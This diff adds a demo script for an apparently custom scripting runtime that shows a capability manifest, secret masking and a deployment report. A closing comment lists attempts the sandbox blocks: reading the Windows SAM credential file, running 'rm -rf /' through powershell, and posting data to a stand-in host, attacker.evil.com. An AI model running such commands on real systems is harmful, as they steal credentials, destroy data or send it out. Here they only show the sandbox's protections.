@@ -1,0 +1,94 @@
+#manifest
+requires {
+    version: "1.0",
+    fs.read: ["./config/", "./data/"],
+    fs.write: ["./reports/"],
+    env: ["DEPLOY_ENV", "API_SECRET_TOKEN"],
+    net.http: ["api.internal.company.com"]
+}
+#endmanifest
+
+// ==============================================================================
+// PS2 Secure Automation Runtime Demo (v0.3.0-beta)
+// Demonstrates Zero-Trust Capabilities, Secret Masking, and Audit Logging
+// ==============================================================================
+
+println("=== PS2 Secure Automation Pipeline ===");
+
+// 1. Safe Environment & Secret Handling
+let deployEnv = unwrap_or(sys.env("DEPLOY_ENV"), "staging");
+println("Deployment Environment: " + deployEnv);
+
+// Fetching a confidential secret via sys.secret (automatically masked as [REDACTED])
+let secretOpt = sys.secret("API_SECRET_TOKEN");
+let apiToken = match secretOpt {
+    Some(sec) => sec,
+    None => secret.mask("default_development_bearer_token")
+};
+
+// Even when converted to string or printed, the secret is NEVER leaked to stdout!
+println("Authorized API Token: " + apiToken);
+
+// 2. Reading Configuration from authorized directory
+let configPath = "./config/settings.json";
+let configExists = fs.exists(configPath);
+let mut configData = json.stringify({
+    "cluster": "k8s-prod-eu",
+    "retries": 3,
+    "timeout_sec": 30
+});
+
+if configExists {
+    configData = fs.read_file(configPath);
+}
+
+println("Loaded configuration safely: " + configData);
+
+// 3. Simulating Data Processing & Pipeline Metrics
+let serviceStats = [
+    { "name": "auth-service", "latency_ms": 42, "status": "healthy" },
+    { "name": "billing-service", "latency_ms": 115, "status": "healthy" },
+    { "name": "notification-service", "latency_ms": 28, "status": "healthy" }
+];
+
+let healthyCount = serviceStats 
+    |> filter(s => s["status"] == "healthy")
+    |> len();
+
+println("Healthy Services: " + healthyCount + " / " + len(serviceStats));
+
+// 4. Generating Audit-Ready Report
+let report = {
+    "timestamp": sys.time_ms(),
+    "environment": deployEnv,
+    "services_healthy": healthyCount,
+    "token_used": apiToken, // Notice: Serializing a secret into JSON emits "[REDACTED]"
+    "status": "DEPLOYED_SUCCESSFULLY"
+};
+
+let reportJson = json.stringify(report);
+println("Generated Report: " + reportJson);
+
+// 5. Writing Report to Authorized Directory
+fs.create_dir("./reports");
+fs.write_file("./reports/latest_deployment.json", reportJson);
+println("Report saved to ./reports/latest_deployment.json");
+
+// ==============================================================================
+// 6. Security Boundary Verification (Default-Deny Demonstrations)
+// Any attempt to perform undeclared operations will be blocked by the Runtime:
+//
+// A) Reading unauthorized files:
+//    let breach = fs.read_file("C:/Windows/System32/config/SAM"); 
+//    -> Throws: [Zero-Trust Sandbox] Read access denied to 'C:/Windows/System32/config/SAM'
+//
+// B) Spawning unauthorized processes:
+//    let proc = sys.exec("powershell.exe", ["-Command", "rm -rf /"]);
+//    -> Throws: [Zero-Trust Sandbox] Execution of external binary 'powershell.exe' denied
+//
+// C) Exfiltrating data to untrusted network domains:
+//    let exfil = net.post("https://attacker.evil.com/leak", {}, reportJson);
+//    -> Throws: [Zero-Trust Sandbox] Network access denied to host 'attacker.evil.com'
+// ==============================================================================
+
+println("Pipeline completed under Zero-Trust Sandbox enforcement.");
